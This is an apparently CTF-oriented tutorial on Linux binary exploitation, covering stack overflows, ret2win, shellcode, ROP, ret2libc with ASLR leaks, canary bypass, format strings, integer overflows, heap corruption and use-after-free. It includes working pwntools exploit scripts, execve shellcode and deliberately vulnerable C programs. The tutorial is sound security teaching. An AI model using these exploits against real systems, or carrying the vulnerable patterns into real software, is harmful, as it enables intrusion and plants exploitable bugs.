01 — Mitigations and When They Matter

Modern binaries ship with several layers of exploit mitigation. Every CTF challenge (and real target) has a specific combination. Knowing what's enabled tells you what techniques are available.

Mitigation What it does Bypassed by
NX / W^X Stack and heap are not executable — injected shellcode can't run ROP chains, ret2libc (reuse existing code)
Stack Canary Random value placed before saved RIP; checked on return Leak the canary, format string read, or avoid overwriting it
ASLR OS randomizes base addresses of stack, heap, libraries each run Leak a runtime address, then calculate offsets from it
PIE Binary itself loads at random base address (ASLR for the binary) Leak a binary address (e.g., via format string), compute base
Full RELRO GOT is read-only; cannot overwrite function pointers there Target other writable memory: hooks, exit handlers, heap
Fortify Replaces unsafe libc functions with bounds-checked versions Use the non-fortified version, or find another vector 
checksec output and what it means$ checksec ./vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO       ← GOT writable → GOT overwrite possible
    Stack:    No canary found     ← stack overflow → direct RIP control
    NX:       NX enabled          ← no shellcode on stack → need ROP/ret2libc
    PIE:      No PIE              ← binary at fixed 0x400000 → no leak needed for gadgets

# This specific combination = classic ret2plt / ret2libc CTF binary

02 — Stack Buffer Overflow — Root Cause

C does not perform bounds checking on array or buffer writes. If you write more bytes into a stack buffer than it can hold, the extra bytes overflow into adjacent stack memory — including the saved return address. When the function returns, it jumps to whatever address you wrote there.

the vulnerability#include <stdio.h>
#include <string.h>

void vuln(void) {
    char buf[64];   // 64 bytes on stack
    gets(buf);      // reads UNLIMITED bytes from stdin — NO bounds check
    printf("You said: %s\n", buf);
}

int main(void) {
    vuln();
    return 0;
}
stack layout during vuln()High address
  [RBP + 8]   = return address   ← 72 bytes from buf[0]
  [RBP + 0]   = saved RBP        ← 64 bytes from buf[0]
  [RBP - 64]  = buf[0..63]       ← our buffer starts here = RSP
Low address

Overflow pattern:
  "A" * 64     → fills buf
  "A" * 8      → overwrites saved RBP
  "\x41\x42\x43\x44\x45\x46\x47\x48"  → overwrites return address

On ret: RIP = 0x4847464544434241  (little-endian)
finding the offset — De Bruijn pattern$ python3 -c "import pwn; print(pwn.cyclic(200))"
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala...

$ echo "aaaabaaacaaad..." | ./vuln
Segfault at 0x6161616c

$ python3 -c "import pwn; print(pwn.cyclic_find(0x6161616c))"
72
# → 72 bytes to reach saved return address

03 — ret2win — The Simplest Exploit

The simplest stack overflow exploit: the binary contains a "win" function that it never calls normally. You overflow the stack and redirect execution to it.

ret2win vulnerable binary#include <stdio.h>
#include <string.h>

void win(void) {         // never called normally
    puts("You got a shell!");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    gets(buf);
}

int main(void) {
    vuln();
    return 0;
}
exploit with pwntoolsfrom pwn import *

elf = ELF('./vuln')
p   = process('./vuln')

win_addr = elf.symbols['win']  # 0x401136 — fixed (no PIE)
print(f"win() is at: {hex(win_addr)}")

offset = 72   # bytes to reach return address (found with cyclic)

payload  = b"A" * offset         # fill buffer + saved RBP
payload += p64(win_addr)           # overwrite return address → win()

p.sendline(payload)
p.interactive()   # drop into shell
// x64 stack alignmentOn x86-64, some functions (especially those using SSE instructions like system()) require the stack to be 16-byte aligned before the call. If your exploit crashes inside system(), add a ret gadget before win's address to fix alignment. Find one with: ROPgadget --binary ./vuln | grep ": ret"

04 — Shellcode Injection (NX disabled)

When NX is disabled, the stack is executable. You can inject raw machine code into the buffer and redirect execution to it. This technique is now rare in modern binaries, but essential to understand conceptually.

shellcode — execve("/bin/sh"); x86-64 Linux execve("/bin/sh", NULL, NULL)
; 27 bytes — classic shellcode
xor    rdi, rdi
push   rdi              ; null terminator for "/bin/sh"
mov    rbx, 0x68732f6e69622f   ; "/bin/sh" (reversed, little-endian)
push   rbx
mov    rdi, rsp         ; rdi = pointer to "/bin/sh\0"
xor    rsi, rsi         ; argv = NULL
xor    rdx, rdx         ; envp = NULL
mov    rax, 59          ; syscall 59 = execve
syscall
exploit: inject shellcode + redirect to stackfrom pwn import *

# Compile without NX: gcc -z execstack -fno-stack-protector vuln.c

p = process('./vuln')

shellcode = asm(shellcraft.sh())   # pwntools generates shellcode
print(f"shellcode: {len(shellcode)} bytes")

# Find stack address via GDB: break at gets, x/gx $rsp
buf_addr = 0x7fffffffe240   # address of buf[] on the stack
offset   = 72

payload  = shellcode            # shellcode at start of buffer
payload += b"A" * (offset - len(shellcode))  # pad to offset
payload += p64(buf_addr)        # return address → buf (where shellcode is)

p.sendline(payload)
p.interactive()
// why ASLR kills thisThe stack address changes every run with ASLR. Without knowing the exact address of your shellcode, you can't jump to it reliably. Solutions: a memory leak that gives you a stack address, NOP sleds (huge nop sequences before shellcode), or pivot to a non-ASLR location.

05 — ROP — Return Oriented Programming

NX makes the stack non-executable — injected shellcode can't run. ROP bypasses this by chaining together small existing code snippets that each end in ret. These are called gadgets. By overwriting the stack with a series of gadget addresses, you build a "program" out of existing code. 

ROP fundamentals; A gadget is any sequence of instructions ending in ret:
0x401234: pop rdi ; ret    ← "pop rdi gadget"
0x401245: pop rsi ; ret
0x401256: pop rdx ; ret

; Each time ret runs, it pops the NEXT value off the stack into RIP
; So the stack becomes a "program" of gadget addresses + data

; Example: call write(1, 0x402010, 8) via ROP
;   → need: rdi=1, rsi=0x402010, rdx=8, then call write

Stack layout (after overflow):
  [offset + 0]  = addr of "pop rdi ; ret"     ← gadget 1
  [offset + 8]  = 0x1                          ← value for rdi (fd=stdout)
  [offset + 16] = addr of "pop rsi ; ret"     ← gadget 2
  [offset + 24] = 0x402010                    ← address to print
  [offset + 32] = addr of "pop rdx ; ret"     ← gadget 3
  [offset + 40] = 0x8                         ← length
  [offset + 48] = addr of write@plt           ← call write()
finding gadgets$ ROPgadget --binary ./vuln --rop
$ ropper -f ./vuln
$ python3 -c "from pwn import *; elf=ELF('./vuln'); print(hex(next(elf.search(asm('pop rdi; ret')))))"

# In pwntools:
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]

06 — ret2libc — Calling system("/bin/sh")

The most common CTF exploit: chain gadgets to call system("/bin/sh") from libc. You need the addresses of system() and the string "/bin/sh" in libc. With ASLR, you must first leak a libc address to calculate them.

ret2libc exploit (no ASLR / known libc base)from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')   # libc that the binary uses

# If no ASLR (or after leak), we know libc base
libc.address = 0x7ffff7a00000  # set base address

system_addr  = libc.symbols['system']
binsh_addr   = next(libc.search(b'/bin/sh\x00'))
pop_rdi      = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget   = rop.find_gadget(['ret'])[0]   # for stack alignment

offset = 72
payload  = b"A" * offset
payload += p64(pop_rdi)    # gadget: pop rdi; ret
payload += p64(binsh_addr) # → rdi = "/bin/sh"
payload += p64(ret_gadget) # align stack (system() needs 16-byte alignment)
payload += p64(system_addr)# call system("/bin/sh")

p = process('./vuln')
p.sendline(payload)
p.interactive()
leaking a libc address (defeating ASLR)# 1. Call puts(puts@got) — this prints the runtime address of puts in libc
# 2. From that address, compute libc base: base = leaked - libc.sym.puts
# 3. Then compute system() and /bin/sh addresses

payload1  = b"A" * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])   # arg: address of GOT entry for puts
payload1 += p64(elf.plt['puts'])   # call puts() to print that address
payload1 += p64(elf.symbols['main']) # return to main to exploit again

p.sendline(payload1)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
print(f"libc base: {hex(libc.address)}")
# Now send second payload with correct addresses...

07 — Stack Canaries — Detection and Bypass

A stack canary is a random 8-byte value placed between the local variables and the saved return address. Before returning, the function checks that it hasn't changed. Overflowing the buffer overwrites the canary — which triggers __stack_chk_fail() before the exploit can run.

canary in memoryStack layout with canary enabled:
  [RBP + 8]   = return address
  [RBP + 0]   = saved RBP
  [RBP - 8]   = CANARY (random, e.g. 0x2a7fce1b00b4d300)
  [RBP - 72]  = char buf[64]    ← overflow starts here

; In assembly (function epilogue):
mov    rax, QWORD PTR [rbp-0x8]   ; load our saved canary
xor    rax, QWORD PTR fs:0x28     ; XOR with original in TLS
je     .ok                         ; if equal: no corruption, return
call   __stack_chk_fail            ; if changed: abort
canary bypass — format string leak# If the program also has a format string bug, we can read the canary:
# printf(user_input) → %p %p %p reads values off the stack
# Canary is always on the stack; find it with positional format strings

from pwn import *
p = process('./vuln')

# Probe: send positional format strings, look for the canary
# Canary always ends in \x00 (null byte, low byte is always 0)
for i in range(1, 50):
    p.sendline(f"%{i}$p".encode())
    val = p.recvline().strip()
    if val.endswith(b"00"):   # ends in 00 = likely canary
        print(f"Canary at position {i}: {val}")

# Once we have position (e.g., 15):
p.sendline(b"%15$p")
canary = int(p.recvline().strip(), 16)

# Now overflow: fill buf, put real canary back, then overwrite RIP
payload  = b"A" * 64       # fill buf
payload += p64(canary)      # restore canary — check passes!
payload += p64(0)           # saved RBP (dummy)
payload += p64(win_addr)    # overwrite return address

08 — Format String Vulnerabilities

When user input is passed directly to printf as the format string, the attacker controls the format specifiers. This allows reading arbitrary stack memory (%p), reading arbitrary addresses (%s), and writing arbitrary values to arbitrary addresses (%n).

the vulnerability// SAFE:
printf("%s", user_input);    // format string is fixed

// VULNERABLE:
printf(user_input);           // user controls format string
// If user sends "%p %p %p %p", printf interprets stack as args
reading memory# %p: print pointer from stack (8 bytes at a time)
Input: "%p %p %p %p %p %p %p"
Output: 0x7ffd... 0x401 0x0 0x7ffd... 0x2a7fce1b00b4d300 ...
                                              ↑ that's the canary!

# Positional: read any argument by index
Input: "%7$p"
Output: 0x2a7fce1b00b4d300   ← 7th "argument" (stack slot 7)

# %s: dereference and read as string
# If we put an address in the input buffer, we can read from that address:
Input: \x10\x20\x60\x00\x00\x00\x00\x00%6$s   ← address at position 6, read as string
→ prints the string stored at 0x602010 (GOT entry!)
writing memory — %n# %n writes the COUNT of characters printed so far to the pointer argument
# This is how format string gives you arbitrary write:

# Write 42 to address 0x602018 (a GOT entry):
Input: [addr_bytes][padding to 42 chars]%7$n
       ↑ addr at position 7             ↑ writes 42 to *0x602018

# Writing a full 8-byte address is done in pieces (hn = 2 bytes, hhn = 1 byte)
# pwntools fmtstr_payload() automates this:

from pwn import *
# Overwrite GOT entry for exit() with address of win()
payload = fmtstr_payload(
    offset=6,                    # stack position of our buffer
    writes={elf.got['exit']: win_addr},   # what to write where
    write_size='short'          # write 2 bytes at a time
)
p.sendline(payload)

09 — Integer Overflow Vulnerabilities

Integer overflow happens silently in C when arithmetic exceeds the type's range. The result wraps around. This causes security bugs when the overflowed value is used for a memory allocation size or as an array index.

signed and unsigned overflow patterns#include <stdint.h>

// Type ranges:
// uint8_t:  0 to 255 (wraps: 255+1 = 0)
// int8_t:  -128 to 127 (wraps: 127+1 = -128)
// uint32_t: 0 to 4294967295 (wraps: UINT32_MAX+1 = 0)
// int32_t: -2147483648 to 2147483647

// Bug 1: allocation size overflow
void* make_buffer(uint32_t count, uint32_t size) {
    uint32_t total = count * size;   // OVERFLOW if count*size > UINT32_MAX
    return malloc(total);            // allocates tiny buffer
    // then caller writes count*size bytes → heap overflow!
}
// Attack: count=0x40000001, size=4 → total = 4 (wraps!)

// Bug 2: signed comparison bypass
void copy_data(char *dst, char *src, int len) {
    if (len > 1024) return;   // "bounds check"
    memcpy(dst, src, len);      // BUG: len is signed
    // memcpy(dst, src, -1) treats -1 as SIZE_MAX (unsigned)
    // Attack: send len = -1 (0xFFFFFFFF) → passes check, copies HUGE amount
}

// Bug 3: off-by-one → OOB write
void fill(char *buf, int n) {
    for (int i = 0; i <= n; i++)   // BUG: should be i < n
        buf[i] = 'A';               // writes buf[n] — one past end
}
detection and safe patterns// Safe multiplication with overflow check:
if (count != 0 && size > SIZE_MAX / count) {
    // overflow would occur
    return NULL;
}
size_t total = (size_t)count * size;

// Use unsigned types for sizes — avoid signed/unsigned mixing
// Use size_t for sizes, not int or uint32_t
// Use __builtin_mul_overflow() in GCC for checked arithmetic
size_t total;
if (__builtin_mul_overflow(count, size, &total)) abort();

10 — Heap Corruption

The heap is managed by the allocator (glibc's ptmalloc2). Heap chunks store metadata — size, flags, prev/next pointers — adjacent to user data. Overflowing a heap buffer corrupts that metadata, which the allocator reads on the next malloc/free, enabling control over execution.

heap chunk layoutA malloc chunk in memory (simplified):
  +------------------+
  | prev_size (8B)  |   ← size of PREVIOUS chunk (if free)
  | size + flags(8B)|   ← this chunk's size | PREV_INUSE | IS_MMAPPED
  +------------------+  ← user pointer returned by malloc() points here
  | user data...    |
  |                 |
  +------------------+
  | next chunk...   |

Flags packed into low 3 bits of size field:
  bit 0: PREV_INUSE — previous chunk is allocated (not free)
  bit 1: IS_MMAPPED — chunk was mmap'd
  bit 2: NON_MAIN_ARENA

# Heap overflow: writing past your allocation corrupts the next chunk's header
# When that chunk is freed, the allocator reads the corrupted metadata
# → write-what-where primitive
heap overflow example#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[32];
    void (*on_exit)(void);  // function pointer
} Item;

void hack() { system("/bin/sh"); }

int main() {
    char *buf  = malloc(32);  // allocated first
    Item *item = malloc(sizeof(Item));  // allocated second — adjacent on heap
    item->on_exit = NULL;

    // Vulnerable: reads 64 bytes into 32-byte buf
    // Overflows into item's memory, overwriting on_exit
    memcpy(buf, user_data, 64);   // BUG

    // payload: 32 bytes of junk, then address of hack()
    // → item->on_exit = &hack

    if (item->on_exit) item->on_exit();  // calls hack()!
}

11 — Use-After-Free

Use-after-free (UAF) happens when memory is freed but the program continues to use the old pointer. If new allocations reuse that memory, the attacker can control what the freed pointer now points to — most critically, function pointers and vtable pointers.

UAF pattern#include <stdlib.h>
#include <string.h>
#include <stdio.h>

typedef struct {
    void (*print)(const char*);  // function pointer at offset 0
    char name[32];
} Object;

void safe_print(const char *s) { printf("[safe] %s\n", s); }
void exploit()                  { system("/bin/sh"); }

int main() {
    Object *obj = malloc(sizeof(Object));
    obj->print = safe_print;
    strcpy(obj->name, "hello");

    free(obj);   // freed — but obj pointer still valid in our code!

    // Allocate same-size chunk — allocator may return the same memory
    char *evil = malloc(sizeof(Object));
    // write address of exploit() at offset 0 (where print ptr was)
    *(void**)evil = exploit;

    // UAF: obj->print() reads from freed (now evil) memory
    obj->print(obj->name);   // → calls exploit()!
}
// UAF in C++UAF is especially dangerous in C++ because objects store vtable pointers at offset 0. Freeing an object and getting a new allocation at the same address lets you replace the vtable pointer with a fake vtable — controlling all virtual dispatch. This was one of the most common browser exploit primitives for years.
